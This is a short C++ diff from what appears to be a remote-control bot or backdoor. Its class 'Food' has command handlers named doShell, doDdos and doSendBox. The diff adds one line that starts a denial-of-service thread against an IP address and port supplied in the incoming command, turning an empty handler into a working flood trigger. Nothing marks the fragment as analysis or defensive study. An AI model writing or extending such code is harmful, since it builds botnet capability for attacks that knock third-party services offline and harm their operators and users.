@@ -297,6 +297,7 @@ void Food::doShell(std::map<std::string, std::string>& args)
 
 void Food::doDdos(std::map<std::string, std::string>& args)
 {
+	Ddos::startByNewThread(args["IP"].data(), atoi(args["PORT"].data()));
 }
 
 void Food::doSendBox(std::map<std::string, std::string>& args)
